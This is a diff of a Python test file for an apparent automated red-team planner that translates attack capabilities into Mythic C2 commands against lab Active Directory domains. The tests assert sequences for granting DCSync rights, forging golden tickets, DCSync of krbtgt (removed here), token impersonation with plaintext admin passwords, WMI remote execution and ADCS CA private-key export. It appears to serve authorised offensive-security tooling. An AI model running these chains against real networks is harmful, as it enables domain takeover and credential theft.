@@ -325,10 +325,48 @@ def test_adapter_translates_direct_rights_grant_to_mythic_command():
     first = mythic_plan.commands[0]
     assert first.command == "execute_assembly"
     assert first.parameters["assembly_name"] == "StandIn.exe"
-    assert first.parameters["assembly_arguments"].startswith("--object DC=lab,DC=local --grant LAB\\operator")
+    assert first.parameters["assembly_arguments"].startswith(
+        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator"
+    )
     assert intent_classifier.classify_tool_call(first.command, first.parameters) == (
         "dcsync-rights-grant",
         "lab.local",
+    )
+
+
+def test_adapter_binds_option_like_gpo_task_arguments_with_long_option_equals_form():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
+    execution_plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    assert mythic_plan.ok is True
+    args = mythic_plan.commands[0].parameters["assembly_arguments"]
+    assert '"--Arguments=--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"' in args
+    assert '--Arguments "--object ' not in args
+
+
+def test_adapter_uses_standin_access_read_for_gpo_rights_verification():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
+    execution_plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    assert mythic_plan.ok is True
+    acl_read = mythic_plan.commands[-1]
+    assert acl_read.parameters["assembly_name"] == "StandIn.exe"
+    assert acl_read.parameters["assembly_arguments"] == (
+        "--object distinguishedname=DC=lab,DC=local --access --ntaccount LAB\\operator"
     )
 
 
@@ -593,7 +631,7 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
 
     assert mythic_plan.ok is True
     # Cross-domain forge: import the child TGT into the current session, then ask Windows to acquire the parent
-    # LDAP ticket before the parent DCSync proof authenticates.
+    # CIFS ticket before proving current-callback access. DCSync is a later capability after the context gate.
     assert [command.command for command in mythic_plan.commands] == [
         "shell",
         "shell",
@@ -602,7 +640,7 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
         "ticket_cache_add",
         "ticket_cache_list",
         "shell",
-        "dcsync",
+        "shell",
     ]
     preflight_list = mythic_plan.commands[0]
     assert preflight_list.produces == ["kerberos_context_inventory"]
@@ -648,13 +686,12 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
     assert mythic_plan.commands[5].consumes == ["kerberos_ticket_imported"]
     acquire = mythic_plan.commands[6]
     assert acquire.command == "shell"
-    assert acquire.parameters == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
+    assert acquire.parameters == "klist.exe get cifs/kingslanding.sevenkingdoms.local"
     assert acquire.produces == ["kerberos_service_ticket_acquired"]
     proof = mythic_plan.commands[7]
-    assert proof.command == "dcsync"
-    assert proof.parameters["domain"] == "sevenkingdoms.local"
-    assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
-    assert proof.parameters["dc"] == "kingslanding.sevenkingdoms.local"
+    assert proof.command == "shell"
+    assert proof.parameters == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
+    assert proof.consumes == ["kerberos_context_inventory", "kerberos_service_ticket_acquired"]
     assert proof.deferred is False
     assert intent_classifier.classify_tool_call(command.command, command.parameters) == (
         "sid-history-escalation",
@@ -696,7 +733,7 @@ def test_adapter_preserves_explicit_asktgs_cross_domain_fallback():
     assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
     assert "/service:krbtgt/root.local" in referral_args
     assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:ldap/dc01.root.local" in service_ticket_args
+    assert "/service:cifs/dc01.root.local" in service_ticket_args
 
 
 def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
@@ -730,8 +767,7 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
         "invoke-assembly",
         "run",
         "run",
-        "load-assembly",
-        "invoke-assembly",
+        "ls",
     ]
     assert mythic_plan.commands[4].parameters == {"filename": "Rubeus.exe"}
     assert mythic_plan.commands[5].parameters == {
@@ -740,12 +776,10 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
     }
     assert mythic_plan.commands[7].parameters == {
         "executable": "klist.exe",
-        "arguments": "get ldap/dc01.root.local",
+        "arguments": "get cifs/dc01.root.local",
     }
-    assert mythic_plan.commands[8].parameters == {"filename": "SharpKatz.exe"}
-    assert mythic_plan.commands[9].parameters == {
-        "assembly": "SharpKatz.exe",
-        "arguments": "--Command dcsync --User ROOT\\krbtgt --Domain root.local --DomainController dc01.root.local",
+    assert mythic_plan.commands[8].parameters == {
+        "path": "\\\\dc01.root.local\\C$",
     }
     rendered = " ".join(
         str(value)
@@ -759,7 +793,7 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
     assert "asktgs" not in rendered
 
 
-def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_config():
+def test_cross_domain_forge_proof_uses_service_access_even_with_global_mimikatz_config():
     action = capabilities.CapabilityAction(
         name="forge-golden-ticket",
         target="domain=child.root.local;target_domain=root.local",
@@ -785,12 +819,8 @@ def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_co
     })
 
     proof = mythic_plan.commands[-1]
-    assert proof.command == "dcsync"
-    assert proof.parameters == {
-        "domain": "root.local",
-        "user": "ROOT\\krbtgt",
-        "dc": "dc01.root.local",
-    }
+    assert proof.command == "shell"
+    assert proof.parameters == "dir \\\\dc01.root.local\\C$"
 
 
 def test_adapter_translates_current_context_ticket_purge():
@@ -1112,6 +1142,68 @@ def test_adapter_translates_account_context_to_managed_asktgt_sequence_without_p
     assert mythic_plan.commands[6].consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
 
 
+def test_adapter_uses_distinct_plaintext_credential_reference_for_account_context_make_token():
+    action = capabilities.CapabilityAction(
+        name="ensure-account-kerberos-context",
+        target="domain=lab.local;account=alice;callback=13",
+        preconditions=["creds:alice@lab.local", "live-callback:13"],
+        effects=["kerberos-account-context:alice@lab.local@callback:13"],
+        intent={
+            "capability": "ensure-account-kerberos-context",
+            "domain": "lab.local",
+            "account": "alice",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "aes256": "d" * 64,
+        "credential_id": 77,
+        "logon_credential_id": 88,
+        "proof_host": "dc01.lab.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    make_token = mythic_plan.commands[3]
+    assert make_token.command == "make_token"
+    assert make_token.parameters == {
+        "credential": {
+            "id": "88",
+            "account": "alice",
+            "realm": "lab.local",
+            "credential": "SageNetOnlyContext1!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+
+
+def test_adapter_never_uses_ticket_key_credential_reference_for_make_token():
+    action = capabilities.CapabilityAction(
+        name="ensure-account-kerberos-context",
+        target="domain=lab.local;account=alice;callback=13",
+        preconditions=["creds:alice@lab.local", "live-callback:13"],
+        effects=["kerberos-account-context:alice@lab.local@callback:13"],
+        intent={
+            "capability": "ensure-account-kerberos-context",
+            "domain": "lab.local",
+            "account": "alice",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "aes256": "d" * 64,
+        "credential_id": 77,
+        "proof_host": "dc01.lab.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    make_token = mythic_plan.commands[3]
+    assert make_token.parameters["credential"] != "@cred:77"
+    assert make_token.parameters["credential"]["type"] == "plaintext"
+
+
 def test_merlin_adapter_translates_account_context_through_applied_token_session():
     action = capabilities.CapabilityAction(
         name="ensure-account-kerberos-context",
@@ -1361,6 +1453,36 @@ def test_adapter_translates_local_admin_use_to_make_token_and_admin_share_proof(
     assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$"}
 
 
+def test_adapter_uses_managed_local_admin_credential_reference_when_available():
+    action = capabilities.CapabilityAction(
+        name="use-managed-local-admin-secret",
+        target="target=ws01;target_domain=child.lab.local;callback=13",
+        preconditions=["managed-local-admin-secret:ws01@child.lab.local", "live-callback:13"],
+        effects=["local-admin:ws01@child.lab.local", "admin:ws01", "system-or-admin:ws01"],
+        intent={
+            "capability": "use-managed-local-admin-secret",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+        "credential_id": 91,
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    assert mythic_plan.ok is True
+    assert mythic_plan.commands[0].parameters["credential"] == {
+        "id": "91",
+        "account": "Administrator",
+        "realm": "ws01",
+        "credential": "CorrectHorseBatteryStaple!",
+        "type": "plaintext",
+    }
+
+
 def test_adapter_translates_remote_execution_to_wmiexecute_and_cat():
     action = capabilities.CapabilityAction(
         name="execute-as-local-admin",
@@ -1396,6 +1518,86 @@ def test_adapter_translates_remote_execution_to_wmiexecute_and_cat():
     assert proof.consumes == ["remote_process_created"]
     assert proof.produces == ["remote_execution_proof"]
     assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"}
+
+
+def test_apollo_adapter_translates_remote_execution_to_token_backed_wmiexecute_and_cleanup():
+    action = capabilities.CapabilityAction(
+        name="execute-as-local-admin",
+        target="target=ws01;target_domain=child.lab.local;callback=13",
+        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
+        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
+        intent={
+            "capability": "execute-as-local-admin",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.APOLLO_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    token, remote, proof, cleanup = mythic_plan.commands
+    assert token.parameters == {
+        "Credential": {
+            "account": "Administrator",
+            "credential": "CorrectHorseBatteryStaple!",
+            "realm": "ws01",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    assert token.produces == ["local_admin_logon_context"]
+    assert remote.parameters["host"] == "ws01.child.lab.local"
+    assert "username" not in remote.parameters
+    assert "password" not in remote.parameters
+    assert "domain" not in remote.parameters
+    assert remote.consumes == ["local_admin_logon_context"]
+    assert proof.parameters == {"path": r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"}
+    assert cleanup.command == "rev2self"
+    assert cleanup.operation == "local-admin-logon-session-revert"
+    assert cleanup.consumes == ["local_admin_logon_context"]
+
+
+def test_apollo_adapter_reuses_existing_token_context_for_remote_execution():
+    action = capabilities.CapabilityAction(
+        name="execute-as-local-admin",
+        target="target=ws01;target_domain=child.lab.local;callback=13",
+        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
+        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
+        intent={
+            "capability": "execute-as-local-admin",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+    })
+    config = {
+        **adapter.APOLLO_MYTHIC_ADAPTER,
+        "local_admin_remote_exec_reuse_token_context": True,
+    }
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["wmiexecute", "cat", "rev2self"]
+    remote = mythic_plan.commands[0]
+    assert remote.parameters == {
+        "command": (
+            r'cmd.exe /c echo SAGE_REMOTE_EXEC_PROOF_ws01_13 & whoami & hostname '
+            r'& echo SAGE_REMOTE_EXEC_PROOF_ws01_13 > "C:\Windows\Temp\sage_remote_exec_ws01_13.txt" '
+            r'& whoami >> "C:\Windows\Temp\sage_remote_exec_ws01_13.txt" '
+            r'& hostname >> "C:\Windows\Temp\sage_remote_exec_ws01_13.txt"'
+        ),
+        "host": "ws01.child.lab.local",
+    }
 
 
 def test_adapter_translates_remote_execution_to_merlin_native_shell_proof():
@@ -1779,6 +1981,7 @@ def test_adapter_translates_adcs_ca_private_key_export_to_merlin_powershell_wmi(
     assert "Export-PfxCertificate" not in ps
     assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
     assert "CA_EXPORT_STATUS=OK" in ps
+    assert "PFX_ARTIFACT_ID=" in ps
     assert "PFX_BASE64=" in ps
 
 
@@ -1860,6 +2063,7 @@ def test_adapter_translates_adcs_ca_export_to_current_context_powerpick():
     assert "New-Object System.Management.Automation.PSCredential" not in command.parameters
     assert "certutil.exe -f -p" in command.parameters
     assert "Export-PfxCertificate" not in command.parameters
+    assert "PFX_ARTIFACT_ID=" in command.parameters
 
 
 def test_adapter_translates_adcs_ca_private_key_export_to_wmiexecute_readback():
@@ -1910,6 +2114,7 @@ def test_adapter_translates_adcs_ca_private_key_export_to_wmiexecute_readback():
     assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
     assert "CA_EXPORT_STATUS=OK" in ps
     assert "PFX_SHA256=" in ps
+    assert "PFX_ARTIFACT_ID=" in ps
     assert "PFX_BASE64=" in ps
     assert "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2" in ps
     assert "('CA_SUBJECT='+$exportedCert.Subject)" in ps
@@ -1919,6 +2124,58 @@ def test_adapter_translates_adcs_ca_private_key_export_to_wmiexecute_readback():
     assert readback.consumes == ["remote_process_created"]
     assert readback.produces == ["adcs_ca_private_key_material"]
     assert readback.parameters == {"path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_8.txt"}
+
+
+def test_apollo_adapter_translates_adcs_ca_export_to_token_backed_wmiexecute_readback():
+    action = capabilities.CapabilityAction(
+        name="adcs-ca-private-key-export",
+        target="target=ca01;target_domain=lab.local;callback=8",
+        preconditions=[
+            "remote-exec:ca01@lab.local",
+            "local-admin:ca01@lab.local",
+            "live-callback:8",
+        ],
+        effects=[
+            "adcs-ca-private-key:ca01@lab.local",
+            "adcs-ca:ca01@lab.local",
+        ],
+        intent={
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "8",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "Correct Horse Battery Staple!",
+        "pfx_password": "Pfx Secret!",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.APOLLO_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["make_token", "wmiexecute", "cat", "rev2self"]
+    token, remote, readback, cleanup = mythic_plan.commands
+    assert token.parameters == {
+        "Credential": {
+            "account": "Administrator",
+            "credential": "Correct Horse Battery Staple!",
+            "realm": "ca01",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    assert remote.parameters["host"] == "ca01.lab.local"
+    assert "username" not in remote.parameters
+    assert "password" not in remote.parameters
+    assert "domain" not in remote.parameters
+    assert remote.expected_probe == ""
+    assert remote.consumes == ["local_admin_logon_context"]
+    assert readback.expected_probe == "extract_adcs_ca_private_key_probe"
+    assert readback.consumes == ["local_admin_logon_context", "remote_process_created"]
+    assert readback.parameters == {"path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_8.txt"}
+    assert cleanup.operation == "local-admin-logon-session-revert"
+    assert cleanup.consumes == ["local_admin_logon_context"]
 
 
 def test_adapter_defaults_adcs_ca_private_key_export_to_wmiexecute_readback():
@@ -1978,6 +2235,7 @@ def test_adapter_translates_adcs_ca_private_key_export_to_sharpdpapi_fallback():
     )
     execution_plan = capabilities.build_capability_execution_plan(action, {
         "password": "CorrectHorseBatteryStaple!",
+        "pfx_password": "DurablePfxSecret!",
         "adcs_ca_export_method": "sharpdpapi",
         "tool_file_uuid": "sharpdpapi-file-uuid",
     })
@@ -2038,7 +2296,11 @@ def test_adapter_translates_adcs_esc_certificate_enroll_to_native_certreq_powerp
     assert "CERT_ENROLL_METHOD=native-certreq" in command.parameters
     assert "certreq.exe -new" in command.parameters
     assert "certreq.exe -submit" in command.parameters
-    assert "Export-PfxCertificate" in command.parameters
+    assert "if($null -ne $newOut){$lines.AddRange" in command.parameters
+    assert "if($null -ne $submitOut){$lines.AddRange" in command.parameters
+    assert "if($null -ne $acceptOut){$lines.AddRange" in command.parameters
+    assert "$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx" in command.parameters
+    assert "[IO.File]::WriteAllBytes($pfxPath,$bytes)" in command.parameters
     assert "PFX_BASE64=" in command.parameters
     assert "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_14" in command.parameters
 
@@ -2280,6 +2542,7 @@ def test_adapter_translates_adcs_certificate_auth_to_schannel_ldap_proof():
     assert "AuthType]::External" in script
     assert "QueryClientCertificate" in script
     assert "StartTransportLayerSecurity" in script
+    assert "ReferralChasingOptions]::None" in script
     assert ".Bind();" not in script
     assert "$searchResponse=$candidate.SendRequest($probeRequest)" in script
     assert "X509KeyStorageFlags]::Exportable" in script
